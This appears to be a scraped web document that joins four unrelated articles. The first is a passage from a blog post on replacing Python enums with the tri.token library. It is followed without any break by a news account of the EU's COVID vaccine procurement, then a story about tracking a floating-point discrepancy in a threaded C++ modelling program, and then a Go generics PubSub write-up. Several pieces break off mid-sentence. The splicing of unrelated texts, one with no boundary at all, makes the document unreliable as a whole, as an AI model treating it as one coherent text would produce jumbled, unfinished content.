<p>Our experience over the years has made us believe that naming things helps, but subtle names help very little. We’ve tried naming the user facing string <code>label</code> and <code>title</code>. Both those are no good and are frequently misunderstood. We’ve settled for <code>display_name</code> as hard to misunderstand.</p>

<p>The example above written with tri.tokens becomes:</p>

<div><div><pre><code><span>class</span> <span>Fruits</span><span>(</span><span>TokenContainer</span><span>):</span>
    <span>apple</span> <span>=</span> <span>Token</span><span>(</span><span>display_name</span><span>=</span><span>'Apple'</span><span>)</span>
</code></pre></div></div>

<p>The only problem here is that the word <code>apple</code> still has no name associated with it. We think this is an ok trade off, and we call this string the “name”, or sometimes “code name”. This is the string that goes into the database. Never anything else!</p>

<h2 id="problem-2-hard-to-add-data">Problem 2: Hard to add data</h2>

<p>With python enums it’s difficult to add additional data for the cases. You can use tuples but it has the same problem of no semantics but it gets worse the bigger the tuple is. This is an example from the official documentation:</p>

<div><div><pre><code><span>class</span> <span>Planet</span><span>(</span><span>Enum</span><span>):</span>
    <span>MERCURY</span> <span>=</span> <span>(</span><span>3.303e+23</span><span>,</span> <span>2.4397e6</span><span>)</span>
    <span>VENUS</span>   <span>=</span> <span>(</span><span>4.869e+24</span><span>,</span> <span>6.0518e6</span><span>)</span>
    <span>EARTH</span>   <span>=</span> <span>(</span><span>5.976e+24</span><span>,</span> <span>6.37814e6</span><span>)</span>
    <span>MARS</span>    <span>=</span> <span>(</span><span>6.421e+23</span><span>,</span> <span>3.3972e6</span><span>)</span>
    <span>JUPITER</span> <span>=</span> <span>(</span><span>1.9e+27</span><span>,</span>   <span>7.1492e7</span><span>)</span>
    <span>SATURN</span>  <span>=</span> <span>(</span><span>5.688e+26</span><span>,</span> <span>6.0268e7</span><span>)</span>
    <span>URANUS</span>  <span>=</span> <span>(</span><span>8.686e+25</span><span>,</span> <span>2.5559e7</span><span>)</span>
    <span>NEPTUNE</span> <span>=</span> <span>(</span><span>1.024e+26</span><span>,</span> <span>2.4746e7</span><span>)</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>mass</span><span>,</span> <span>radius</span><span>):</span>
        <span>self</span><span>.</span><span>mass</span> <span>=</span> <span>mass</span>       <span># in kilograms
</span>        <span>self</span><span>.</span><span>radius</span> <span>=</span> <span>radius</span>   <span># in meters
</span></code></pre></div></div>

<p>It’s impossible to understand the definition of the data without reading the constructor (and the constructor is a bit weird too as <code>self</code> here are the cases, not the <code>Planet</code> class!). The constructor then changes this positional chaos to the named members <code>mass</code> and <code>radius</code>. In <a href="https://tritoken.readthedocs.io/en/latest/">tri.token</a> this would be:</p>

<div><div><pre><code><span>class</span> <span>Planet</span><span>(</span><span>Token</span><span>):</span>
    <span>mass</span> <span>=</span> <span>TokenAttribute</span><span>()</span>
    <span>radius</span> <span>=</span> <span>TokenAttribute</span><span>()</span>


<span>class</span> <span>Planets</span><span>(</span><span>TokenContainer</span><span>):</span>
    <span>MERCURY</span> <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>3.303e+23</span><span>,</span> <span>radius</span><span>=</span><span>2.4397e6</span><span>)</span>
    <span>VENUS</span>   <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>4.869e+24</span><span>,</span> <span>radius</span><span>=</span><span>6.0518e6</span><span>)</span>
    <span>EARTH</span>   <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>5.976e+24</span><span>,</span> <span>radius</span><span>=</span><span>6.37814e6</span><span>)</span>
    <span>MARS</span>    <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>6.421e+23</span><span>,</span> <span>radius</span><span>=</span><span>3.3972e6</span><span>)</span>
    <span>JUPITER</span> <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>1.9e+27</span><span>,</span>   <span>radius</span><span>=</span><span>7.1492e7</span><span>)</span>
    <span>SATURN</span>  <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>5.688e+26</span><span>,</span> <span>radius</span><span>=</span><span>6.0268e7</span><span>)</span>
    <span>URANUS</span>  <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>8.686e+25</span><span>,</span> <span>radius</span><span>=</span><span>2.5559e7</span><span>)</span>
    <span>NEPTUNE</span> <span>=</span> <span>Planet</span><span>(</span><span>mass</span><span>=</span><span>1.024e+26</span><span>,</span> <span>radius</span><span>=</span><span>2.4746e7</span><span>)</span>
</code></pre></div></div>

<p>This has clear semantics for each row and removes the need for the constructor on the Enum class.</p>

<p>Another common solution to the problem above is to have the data for mass and radius somewhere else. This results in several dicts you need to reconcile and validate.</p>

<h2 id="problem-3-scales-badly-for-sparse-data">Problem 3: scales badly for sparse data</h2>

<p>We have many cases with sparse data. This is what it would look with enums:</p>

<div><div><pre><code><span>class</span> <span>Fields</span><span>(</span><span>Enum</span><span>):</span>
    <span>party_group_name</span> <span>=</span> <span>(</span><span>default</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>'rec_party'</span><span>,</span> <span>default</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>)</span>
</code></pre></div></div>

<p><code>None</code> here means it doesn’t exist and the sentinel <code>default</code> means to automatically generate the default. In tri.token this would be:</p>

<div><div><pre><code><span>class</span> <span>Fields</span><span>(</span><span>TokenContainer</span><span>):</span>
    <span>party_group_name</span> <span>=</span> <span>Field</span><span>(</span><span>total_download_name</span><span>,</span> <span>dw_name</span><span>=</span><span>"rec_party"</span><span>)</span>
</code></pre></div></div>

<p><code>total_download_name</code> here is a special sentinel value so we can shorten <code>total_download_name=default</code> to just <code>total_download_name</code>.</p>

<p>This problem grows with each case of the enum. As of this writing the <code>Fields</code> container from this example has 486 cases, making the sparse data issue much worse.</p>

<h2 id="problem-4-dangerous-to-work-around-these-problems">Problem 4: dangerous to work around these problems</h2>

<p>One could make all the cases for an Enum into dicts:</p>

<div><div><pre><code><span>class</span> <span>Fields</span><span>(</span><span>Enum</span><span>):</span>
    <span>party_group_name</span> <span>=</span> <span>dict</span><span>(</span>
        <span>total_download_name</span><span>=</span><span>True</span><span>,</span> 
        <span>dw_name</span><span>=</span><span>"rec_party"</span><span>,</span>
    <span>)</span>
    
    <span>instrument_type</span> <span>=</span> <span>dict</span><span>()</span>
    <span>agreement_curr</span> <span>=</span> <span>dict</span><span>(</span>
        <span>file_column</span>
    <span>)</span>
</code></pre></div></div>

<p>This doesn’t work though because all empty dicts are the same so if you add <code>avg_mtm_diff_usd = dict()</code> now data is thrown away silently.</p>

<h2 id="summary">Summary</h2>

<p>Python native enums are great for what they were designed to do, but we’ve found that they are limited and don’t allow you to grow the complexity and usage in a sane way. We developed tri.token before python enums and were hoping we could throw away tri.token and replace it with enums, but unfortunately this wasn’t the case.</p>

<p>THE EUROPEAN UNION'S VACCINATION EFFORT came under fire just as it was beginning to deliver.</p>



<p>Heralded for months as the flagship of European solidarity during the coronavirus pandemic, the European Commission’s strategy of joint vaccine procurement is now being accused by national leaders of being too bureaucratic, too limiting to its members, too slow.</p>



<p>Specifically, the bloc’s decisions to prioritize process over speed and to put solidarity between EU countries ahead of giving individual governments more room to maneuver have been criticized for holding back the coronavirus response.</p>



<p>This account is based on dozens of interviews with diplomats, Commission officials, pharma industry representatives and national government aides. It details how the European Commission overcame a disorganized start to lead reluctant member countries in a successful effort to reserve an arsenal of vaccines that’s the envy of the world when it comes to cost and the diversification of smart bets.</p>



<p>It also shows how a vaccine strategy that was supposed to be a forceful show of European solidarity, an assertion of the single market’s buying power and a moral stand against Trumpian “vaccine nationalism” resulted in a rollout that has left the EU lagging behind the United Kingdom and the United States.</p>

<p>EU countries stuck together even as the U.S. and the U.K. bought, approved and began injecting vaccines at a faster clip. The result: lower prices, with higher accountability for drugmakers, and shots for the whole of the EU — but also delays in delivery and rising tensions among EU member countries resentful about the tradeoffs.</p>



<p>Over the past 10 months of the global vaccine race, the EU was often a step or two behind: Its move to secure doses came only after warnings that the U.S. might monopolize supply. Its deliberative approach to regulatory approval has left EU citizens lagging behind the U.S. and the U.K. when it comes to getting access to vaccines — at a moment when delays are counted in lost lives.</p>



<p>The blame game playing out in public is a boiling over of mistrust that has undermined the EU’s ambitions to vaccinate its citizens in concert. As the EU has discovered, wielding the market power and moral authority of 27 sovereign nations — with different budgets and perspectives on risk — means moving more slowly than the one-and-done competition. For the bloc’s wealthier countries, especially, the question is whether domestic voters will decide the solidarity is worth the delay.</p>



<h3><strong>‘Large sums of money’</strong></h3>



<p>THE EU'S PUSH INTO VACCINE PROCUREMENT began with a meeting far across the Atlantic — between then U.S. President Donald Trump, his coronavirus task force and a heavy-hitting group of pharmaceutical executives.</p>



<p>The March 2 gathering in the White House Cabinet room made waves in Europe, in particular in Berlin, where journalists zeroed in on the pitch reportedly made to Trump by Daniel Menichella, CEO of CureVac, a German biotech firm.</p>



<p>Curevac had developed an experimental rabies vaccine using a new mRNA technology that instructs the body's cells to train the immune system to fight off a virus. The company’s jab, Menichella said, could be reengineered to fight the novel coronavirus in<a href="https://www.globenewswire.com/news-release/2020/03/02/1993888/0/en/CureVac-CEO-Daniel-Menichella-Discusses-Coronavirus-Vaccine-Development-with-U-S-President-Donald-Trump-and-Members-of-Coronavirus-Task-Force.html" target="_blank"> just a few months</a>.</p>



<p>“<a href="https://www.welt.de/wirtschaft/plus206563595/Trump-will-deutsche-Impfstoff-Firma-CureVac-Traumatische-Erfahrung.html" target="_blank">Trump wants German vaccine company CureVac: Traumatic experience,”</a> blared a headline in Die Welt on March 15. It quoted German health ministry officials alarmed that the U.S. president had offered CureVac “large sums of money” in exchange for exclusive dibs on its as-yet-nonexistent coronavirus vaccine.</p>



<p>A day after the article’s publication, March 16, Commission President Ursula von der Leyen and Ambroise Fayolle, the European Investment Bank’s vice president for innovation, held a virtual face to face with CureVac’s management.</p>



<p>The company and the White House denied any attempt by the U.S. to monopolize the potential vaccine. But von der Leyen and Fayolle were sufficiently spooked. They announced plans to offer CureVac up to €80 million in loans to test and manufacture its vaccine in the EU — even though the EIB hadn’t even started assessing the business case.</p>



<p>“Their home is here,” von der Leyen<a href="https://ec.europa.eu/commission/presscorner/detail/en/IP_20_474" target="_blank"> said</a> in a press release. “But their vaccines will benefit everyone, in Europe and beyond.”</p>



<p>Fears that the U.S. would monopolize coronavirus remedies dominated the discussion at the European Council the next day, as EU leaders <a href="https://www.politico.eu/article/coronavirus-european-leaders-to-hold-videoconference/">met</a> for one of their first COVID-era videoconferences. At a press conference afterward, von der Leyen crowed about convincing CureVac to stay in Europe, bragging that it was the “front-runner in the research.”&nbsp;</p>



<p>In fact, the company was well behind American, British and even European competitors like another medium-sized German firm named BioNTech. Normally focused on cancer, <a href="https://investors.pfizer.com/investor-news/press-release-details/2020/Pfizer-and-BioNTech-to-Co-Develop-Potential-COVID-19-Vaccine/default.aspx" target="_blank">BioNTech announced it would team up</a> with the American behemoth Pfizer to manufacture its mRNA coronavirus vaccine, if it worked.</p>



<p>Behind von der Leyen’s overstatement lay a startling truth: Europe was already losing the race to secure a coronavirus vaccine. As early as mid-February, while the U.S. president was downplaying the virus, his government was making connections with Big Pharma. The U.S. Biomedical Advanced Research and Development Authority had teamed up with<a href="https://www.jnj.com/johnson-johnson-announces-collaboration-with-u-s-department-of-health-human-services-to-accelerate-development-of-a-potential-novel-coronavirus-vaccine" target="_blank"> Johnson &amp; Johnson</a> to look for vaccines on February 11, and a collaboration with the French crown jewel Sanofi had been<a href="https://www.sanofi.com/en/media-room/press-releases/2020/2020-02-18-16-00-00" target="_blank"> announced</a> a week after that.</p>

<p>The CureVac crisis — the “traumatic experience” narrowly averted — became a rallying cry for Europe, and an opportunity for moral leadership for von der Leyen.</p>



<p>When it came to vaccines, von der Leyen was quick to draw a sharp contrast with the U.S., casting “Team Europe” as a communal medicine cabinet, prepared to work together to inoculate not just citizens in every EU country, but the entire world.</p>



<p>Weeks later, after Trump had announced a freeze on U.S. funding for the World Health Organization, von der Leyen<a href="https://www.politico.eu/article/world-leaders-pledge-to-fight-coronavirus/"> hosted a May 4 fundraiser</a> with the U.N. health body and other big philanthropy players. It garnered almost $8 billion, loosely earmarked for research on treatments, tests and vaccines.</p>



<p>The U.S. blew that event off. Instead, Trump formally launched a $10 billion “Operation Warp Speed” on May 15. The goal: invest in experimental vaccines and produce enough to deliver 300 million doses to Americans by January 2021.</p>



<p>The race was just beginning.</p>



<h3><strong>Fear of missing out</strong></h3>



<p>WHEN IT CAME TO WORKING TOGETHER to procure medical supplies during the coronavirus pandemic, the EU did not have a great track record. During the early days of the crisis, EU countries had unilaterally closed their borders and accused each other of hoarding personal protective equipment.</p>



<p>Brussels' response was a system to wield the purchasing power of 37 countries — the EU27 and 10 of their neighbors — to buy masks and ventilators. But as talks turned to vaccines, the program had yet to deliver a single item.</p>



<p>The problem was bureaucracy. Before it could place an order, the Commission had to wait for each EU country to sign the contract. Some countries, fed up with the endless back and forth, simply purchased the items on their own.&nbsp;</p>



<p>Vaccine procurement presented an even more formidable challenge, with a bewildering array of vaccination candidates and pharma companies — none of which had produced a deliverable product.</p>



<p>Some firms appeared to take a page from the CureVac playbook: capitalize on the FOMO. The U.S.’s early investment in Sanofi’s inoculation would translate into priority access for Americans, Sanofi CEO Paul Hudson told<a href="https://www.bloomberg.com/news/articles/2020-05-13/u-s-to-get-sanofi-covid-vaccine-first-if-it-succeeds-ceo-says" target="_blank"> Bloomberg</a> in mid-May. French lawmakers<a href="https://www.politico.eu/?p=1365453"> accused Hudson of “blackmail</a>,” but his strategy seemed to have paid off. Paris and Berlin <a href="https://www.politico.eu/?p=1372904">started direct negotiations</a> about aid and supplies with Sanofi in May.</p>



<p>In the public view, a front-runner in the vaccine race was emerging: Oxford researcher Sarah Gilbert told <a href="https://www.thetimes.co.uk/article/coronavirus-vaccine-could-be-ready-by-september-flmwl257x" target="_blank">the Times on April 11</a> that the vaccine she was developing with AstraZeneca could be ready by September. She was “80 percent confident” it would work.&nbsp;</p>



<p>Bureaucrats tried to keep score at home. “Every vaccine nerd in the Commission and the individual member states would've had their Excel sheet of, here are the interesting vaccines, here's the 100-plus candidates, here's where they all are,” said a Commission official, interviewed on the condition of anonymity to speak candidly about the negotiations.</p>

<p>Meanwhile, EU countries weren’t waiting for the Commission to start to strike deals. France and Spain separately began talks with Moderna, according to the Commission official. By mid-April, Paris and Berlin started negotiating together to buy vaccines, according to an Elysée official.</p>



<p>EU27 health ministers signed off on a Commission plan to buy on their behalf on June 12. But the Franco-German initiative continued to press forward, having invited the Netherlands and Italy to join their buyers’ club. On June 13, the quartet — known as the “Inclusive Vaccine Alliance” — announced a deal for between 300 million and 400 million doses of the Oxford/AstraZeneca jab.</p>



<p>The agreement with AstraZeneca has been described as little more than a one-page term sheet between the companies and health ministers<strong>. </strong>But it was politically significant. It showed that the four countries — representing four of five largest EU economies and roughly a third of the bloc’s population — were not afraid to use their significant buying power and leverage their powerhouse pharma industries, even as the Commission was still searching for its footing.</p>



<p>The Alliance said it would talk to the Commission about working together “where possible” and that other countries could join in — but “the four countries just realized at one point, there's no time to wait until everyone is on board,” said one senior EU diplomat from an alliance country. “Let's just give it a …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>There are approximately 7.5x10^18 grains of sand on Earth. This story is about finding changes in an equation that has a difference of approximately 1e-18 out of hundreds of billions of calculations. That is 7 grains of sand that are different to what we expect across the entire planet Earth.</p>
<p>After spending days generating gigabytes of debug logs and GDB breakpoints, I finally discovered a very peculiar bug in the compiler. I thought this would be an interesting story to tell.</p>
<p><strong>Update: Thanks to gus_massa and wiml @ HackerNews for pointing out I had used associative instead of commutative</strong></p>
<h2>Background</h2>
<p>Back in 2008 I started developing a scientific modelling platform called the <a href="https://niwa.co.nz/fisheries/tools-resources/spatial-population-modelling">Spatial Population Model (SPM)</a>. This software is designed to model or simulate and ocean environments to approximate the health of fish stocks. The output of SPM is used to create scientific reports that are given to Governments for the setting of commercial fishing quota. </p>
<p>Due to the political nature of these reports, reproducibility and integrity of results is crucial. Scientists from around the world will use the software to re-run models across different Operating Systems and compilers to validate results.</p>
<p>Since it was 2008, it was decided that SPM would not be multi-threaded. This is because of: no C++ standard threading, average computer had 2 cores, incompatibility with auto-differentiation libraries) </p>
<p>Fast forward to 2020/21 where many-core systems are commonplace. I had recently acquired for myself an AMD 5950X 16c/32t CPU and was keen to apply it to some modelling work. SPM is still in use as a world leading spatial modelling platform and has received continual updates. I’ve had a long interest in bringing concurrency to SPM to invent new methods of scientific modelling that evolve the underlying mathematics. As a proof of concept, I wanted to start working through threading the internal gradient calculation. Models in SPM are user defined and can be enormous (&gt;100k lines of input text) so we’re unable to analytically determine the gradient function through auto-differentiation. We use an iterative approach tweaking model parameters to calculate the gradient. These tweaks are independent and therefore can be parallelised. </p>
<p>This seemed like a relatively straight forward piece of work. I would need to:</p>
<ol>
<li>Move all of the classes to be children of a new Model class</li>
<li>Remove all singletons</li>
<li>Keep the floating-point operations in the exact same order when calculate on the main thread (IEEE-754)</li>
<li>Support an arbitrary number of threads</li>
<li>Produce identical results regardless of the number of threads, Operating System or compiler</li>
</ol>
<h2>IEEE-754 or the floating-point nightmare</h2>
<p>The development of scientific modelling platforms like SPM requires a significant amount of thought and effort around reproducibility. Given the same input files, any user must be able to re-run your model and get the exact same answer out. This seems incredibly obvious, but it’s not…</p>
<p><a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE-754</a> is the standard for floating-point arithmetic. Floating point math in computers is an approximation. Whenever you see a floating point value it is highly unlikely to be completely accurate. Floating-point arithmetic is commutative, but not associative. So for floating-point numbers,
A + B = B + A always, but
A + (B + C) != (A + B) + C in many cases.
The order in which operations occur within your model will influence the output. While this is inconsequential for small programs or games; this continual adding of errors for scientific models where the number of operations is in the hundreds of billions is consequential. </p>
<p>Every thread we spawn must run the same operations in the exact same order. When the threads give their results back to the main thread, they must do so in a way that ensures that all future operations happen in the exact same order. This is regardless of the number of threads or number of parameters in the model.</p>
<p><em>Side Note: Within scientific models, we use double precision numbers (double) and not single precision (float). Single precision does not have enough precision to handle the number of calculations required. At the end of a model the error added by the approximation of floating-point math is very significant. This limits us to using CPUs over GPUs as the double precision performance of GPUs is not that much better than a modern CPU when you have to factor in the added complexity of writing GPU specific code.</em></p>
<h2>The first signs of trouble</h2>
<p>With my task list ready, I started to work through re-factoring the code. Everything was modified to use a central model class as the parent for the system. This allows me to spawn as many model classes as threads. Everything was compiling and running without crashes. Time to check the output..</p>
<div data-language="text"><pre><code>1999.818926297566804 // original score running no threads
1999.8189264475995515 // my new score running 32 threads</code></pre></div>
<p>A slight difference, nothing to be concerned about as I had probably changed the order of execution for some of the equations by threading them. I was testing with a small model that ran in &lt;5 seconds, so working through each of the instantiated classes to check the code won’t take too long. Another day down and nothing obvious was found. Time to run the application through GDB and the <a href="https://en.wikipedia.org/wiki/AddressSanitizer">Sanitizers</a> looking for issues… nope nothing there either.</p>
<p>A simple model will have recruitment/breeding, ageing and death. I started to reduce and simplify the processes in the model to see if I could identify any key process or parameter. I removed the random number generate and commented out a large amount of complex math… but still no luck.</p>
<h2>Down the rabbit hole of debug logging and GDB</h2>
<p>After three days of trying to find the issue, I had added a LARGE amount of debug logging and had resorted to doing step throughs in GDB looking for a point at which I would notice a change in the result. The log files were 20MBs+ and the model would only show issues after a few iterations… why not immediately?</p>
<p>Was I calling a function later in the model that had the issue? Or was the issue starting earlier but at a greater precision that I was printing. I was printing my debug output with a <a href="https://en.cppreference.com/w/cpp/io/manip/setprecision">precision</a> of 15. Time to increase the precision to 20. This is basically the maximum amount of precision you can print from a double with accuracy. I did a few more model runs and saw that the variation in results had moved to much earlier in the model… almost immediately.</p>
<p>The model would load the configuration file, then construct all of the user defined objects in memory. As part of constructing these objects a bunch of calculations would be run to build caches. To save on moving data between threads each thread would repeat the same process. Every new thread would get the configuration file that had been loaded, create all of the objects and run the initial calculations. GDB showed that even these initial calculates were having different results.</p>
<p>My working folder was littered with files named “fuck”, “fuck1” and “fuckN” each with more than 20MBs of debug output for a small model run. Diff was run across files to see where changes were occurring and how small they were… But still no luck.. everything was going wrong almost immediately but I had no idea why.</p>
<h2>Surely it’s not a compiler bug?</h2>
<p>SPM uses the GCC and MinGW64 compilers. This allows us to have near-identical code for Windows and Linux with common makefiles. I have always preferred <a href="https://jmeubank.github.io/tdm-gcc/">TDM-GCC</a> as this has a current release. In this instance, TDM-GCC 9.2.0 from March 2020. Running the sanitizers was done on OpenSuSe Tumbleweed Linux using GCC 10.2.1. These are both very modern versions of the GCC compiler suite. I have never been one to blame tools for a bug in my code.</p>
<p>At this point, I am way down the rabbit hole trying to find the cause of this bug. Some testing had shown me that:</p>
<ul>
<li>The original binary would produce the same result on every run</li>
<li>My new binary would produce the same result on every run, but different to the original</li>
<li>My new binary would produce the same result regardless of the number of threads.. from 1 to 100</li>
</ul>
<p>That last observation made me curious. Why did my new code produce a different result when I ran it with only one thread? What would make it different from the original binary. Having only 1 thread that was executing would eliminate any race conditions.</p>
<p>In the original binary, we do not create any threads. We load the model, build and run it. In the new code, even with one thread we create that thread, load the model, build and run it. What was I doing during the thread creation process that would cause this issue? Time for GBs of log files and GDB.</p>
<p>Stepping through every operation to validate the output lead me into what we call a selectivity. This is a static piece of code that takes an input, calls a standard simple piece of math and returns an output. These few lines of code had returned different results in a thread and not. Time to analyse the following code:</p>
<div data-language="c++"><pre><code>double CLogisticSelectivity::calculateResult(int Age) {
    double dRet = 0.0;
    double dTemp = (dA50-Age)/dAto95;

    if(dTemp &gt; 5.0)
      dRet = 0.0;
    else if (dTemp &lt; -5.0)
      dRet = dAlpha;
    else
      dRet  = dAlpha/(1.0+pow(19.0,dTemp));

    return dRet;
}</code></pre></div>
<p>If I gave the code Age = 1 then ran it I got the following results:</p>
<div data-language="text"><pre><code>Local  = 0.0010370292068795884059
Thread = 0.0010370292068795879722</code></pre></div>
<p>What gives? There is nothing in here that should be different in a thread. I am not passing in anything but an int with the value of 1. I edited the code to make dA50 and dAto95 local variables to remove any potential race conditions or thread wonkiness and still had the same error in output. Everything was initialized within the same function and the only external value was an Integer. Weird…</p>
<h2>Compiler bug? But how…</h2>
<p>Looking at the code, the only things that could create the bug were the operators and pow() call. These are part of the C++ standard offering so it’s highly unlikely that either of these would have an error. What next?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			<p>Last summer the Go team announced an updated <a href="https://blog.golang.org/generics-next-step">design
draft</a> for adding generics to the
language. Included in the announcement was a new experimentation tool, named
<code>go2go</code>, for developers to compile, test, and run code written using the
generics feature described in the latest design draft. This blog post documents
my experience using the <code>go2go</code> tool to add support for generics to an existing
<a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>
package.</p>
<blockquote>
<p>tl;dr: <a href="https://github.com/benburkert/pubsub/commit/73593d5f0ef07eebf04379244d5446224c793dcb">here is the code
diff</a></p>
</blockquote>
<h2 id="go2go">go2go</h2>
<p>The <code>go2go</code> tool is a working prototype. It can parse the new language syntax
and transform it to a sort of “intermediate” Go 1 code, which can then be fed
to the standard Go compiler and executed. I have read that it relies on
monomorphization to transform code, but I can’t say that I understand what that
means.</p>
<p>You can install the <code>go2go</code> tool now by fetching &amp; building the latest version
of the <code>dev.go2go</code> branch of the <a href="https://go.googlesource.com/go">Go project’s source
repository</a>. There is also an online version at
<a href="https://go2goplay.golang.org/">The go2go Playground</a>.</p>
<h2 id="generic-pubsub">Generic PubSub</h2>
<p>There are many ways generics can be useful in a codebase, but I am particularly
interested in how they can be applied to “container” code. That is, code that
typically implements a specialized algorithm or data structure unrelated to the
structure of the objects it holds.</p>
<p>PubSub is a good fit for generics for a few reasons. The need for high
performance (either low latency or high throughput) meshes well with compiler
optimizations that generics enable. And it is typically used in highly
concurrent programs where correctness checks are critical to avoiding data
races and memory bugs. Generics can lift these checks from runtime to compile
time, which helps the implementer build a correct PubSub implementation.</p>
<p>But, (in my opinion) the most important benefit is the elimination of “book
keeping” code that simplifies the API surface area for consumers of the PubSub
library. It’s a particularly tricky pattern to use correctly as a developer, so
any reductions in API complexity can be a major boon to them.</p>
<h2 id="githubcombenburkertpubsubhttpspkggodevgithubcombenburkertpubsub"><a href="https://pkg.go.dev/github.com/benburkert/pubsub">github.com/benburkert/pubsub</a></h2>
<p>The package I’ve chosen to analyze is a pretty bare bones PubSub
implementation I wrote a while ago. It allows package users to publish and/or
subscribe to a single stream of objects, via a function call/callback or
channel send/receive. The objects can be of any type and are internally tracked
as empty interface instances. There is a complicated API for adding type safe
publishers and subscribers (enforced at runtime), which works with both
<a href="https://github.com/benburkert/pubsub/blob/master/example/typedfunc/main.go">functions</a>
and
<a href="https://github.com/benburkert/pubsub/blob/master/example/typedchan/main.go">channels</a>.</p>
<p>Under the hood, it is broken down into two major components: a fixed size ring
buffer with a max number of readers/writers, and a PubSub layer that sits over
the underlying buffer. The basic API is quite simple, but the API for typed
functions and channels is not: the user has to manipulate the underlying buffer
at times. It’s a leaky abstraction that I wish did not exist.</p>
<p>It has already shown to be quite reliable and performant in production
environments, but (im)proving correctness is always a good thing. Likewise for
removing potential runtime panics.</p>
<h2 id="caveats">Caveats</h2>
<p>At the moment, I’m only interested in how generics can improve the correctness
of this package, its APIs, and programs that consume them. As mentioned above,
<code>go2go</code> is only a prototype, and I don’t expect it to produce a faster or
smaller binary, so I’ve skipped that analysis entirely. There will most
certainly be impacts on performance (both good and bad!), but any investigation
would be pure speculation until generics support moves beyond the prototype
phase.</p>
<p>The <code>go2go</code> tool itself is still rough around the edges: error messages can be
confusing and un-googlable. And it may require code changes to get around
limitations of the tool. The <code>go2go</code> playground is a better place to start
exploring with generics; I don’t recommend the <code>go2go</code> tool route unless you
are working on an existing, multi-file package.</p>
<h2 id="overview">Overview</h2>
<p>I spent two Sunday afternoons on this project, or about 10 hours total. I
hadn’t kept up closely with the state of the generics language feature, so this
included reading parts of the proposal and getting up to speed with the new
tooling and syntax.</p>
<p>The
<a href="https://github.com/benburkert/pubsub/commit/73593d5f0ef07eebf04379244d5446224c793dcb">changes</a>
clocked in at a little over 500 LOC, with about 100 lines of added code. Almost
all of the added code was in additional tests.</p>
<p>I started by updating the <code>Buffer</code> type, next the <code>PubSub</code> type, and finally
the <code>Publisher</code>, <code>Subscriber</code>, and <code>Context</code> types. Nothing else required changes.</p>
<h2 id="buffer"><code>Buffer</code></h2>
<p>The major change to the <code>Buffer</code> type was swapping out the underlying storage slice,
changing it from an empty interface slice (<code>data []interface{}</code>) to a slice of
<code>T</code>s, where <code>T</code> is a <code>comparable</code> type parameter on <code>Buffer</code>. The <code>comprable</code>
trait was needed because the buffer uses an equality check (<code>==</code>) to test if
the next position to read is marked empty (i.e. unwritten). Previously the
package used a typed byte value to mark the initial data slice items as empty.
But because the type of <code>T</code> is now a type parameter, the global empty marker
trick no longer works.</p>
<p>To compensate, an empty value parameter was added to the <code>NewBuffer</code> func and
an <code>empty T</code> field added to <code>Buffer</code>. The new <code>data</code> slice of <code>T</code>s is set to
the empty value instead of the zero value for <code>T</code>. Careful: the empty value
cannot be written to the buffer, so using the <code>T</code>'s zero value may have very
bad consequences if the zero value of <code>T</code> can be written by the program (i.e.
<code>int(0)</code>). In practice, this shouldn’t be an issue because the <code>PubSub</code> type
uses its own trick to avoid having the empty value of <code>T</code> conflict with user
values.</p>
<p>After this small but cardinal set of changes, the rest was mostly swapping out
empty interfaces for type parameters, and adding additional <code>Buffer</code> tests.
Since writing the latest version of this package, I have picked up the habit
of mostly writing <a href="https://dave.cheney.net/2019/05/07/prefer-table-driven-tests">table style
tests</a>. The added
tests were done in this fashion, and they are structured pretty much the same
as non-generic table style tests. It feels like generics could improve these
table style tests further, but it’s not immediately obvious to me. Perhaps
there are improvements lurking around the corner, but for now it’s only a hope.</p>
<h2 id="pubsub"><code>PubSub</code></h2>
<p>Next up was the <code>PubSub</code> type. Unlike the <code>Buffer</code> type, it was important that
the <code>PubSub</code> type be able to work on any type <code>T</code>, not just comparable types
(i.e. <code>[T any]</code> vs <code>[T comparable]</code>). Otherwise, maps and slices would be
unsupported type parameters. This requirement introduced a catch: reusing the
<code>T</code> type parameter on <code>PubSub</code> for <code>Buffer[T]</code> would lift that constraint,
meaning the type for <code>Buffer</code> would have to be comparable.</p>
<p>To get around this, I relied on the comparability of pointers: <a href="https://go2goplay.golang.org/p/Y2XuSbTbbt5">a pointer to a
type with an <code>any</code> type parameter is always
comparable.</a> This meant adding a
layer of indirection via a <code>cell</code> struct, which the underlying <code>Buffer</code> holds a
slice of instead of the <code>T</code>s to <code>PubSub</code>. It might seem unfortunate that the
solution required this extra indirection, but in actuality it doesn’t introduce
any extra overhead compared to the previous version. That is because the <code>cell</code>
type is not much different than the empty interface type that <code>Buffer</code> used
prior. And it also provided a way of reimplementing the unsubscribe mechanism.</p>
<p>The API allows for the function and channel subscribers to unsubscribe by
calling a function or closing a channel, respectively. In both these cases, the
subscriber can signal to the callback/receiver handler to close the
subscription. So each subscriber must have their own way of being signaled for
shutdown.</p>
<p>This signal is implemented as an instance of an empty struct chan. Because
channels have the property of being comparable and equal only to the same
instance of itself, these channels can be used as for both a per-subscriber
marker and for signal delivery. Instead of pushing these channels directly into
the buffer, the <code>cell</code> type added a <code>ch</code> field for these channels. These
“control” <code>cell</code> values can be differentiated from “data” <code>cell</code> values by
setting a non-nil <code>ch</code>.</p>
<p>The <code>PubSub</code> methods were then updated to drop the empty interfaces for type
parameters. The only real behavioral change to a method was in <code>PubSlice</code>: the
<code>[]T</code> argument had to be copied into an equivalent <code>[]cell[T]</code> before being
written to the <code>Buffer</code>. While it is additional overhead, that overhead was
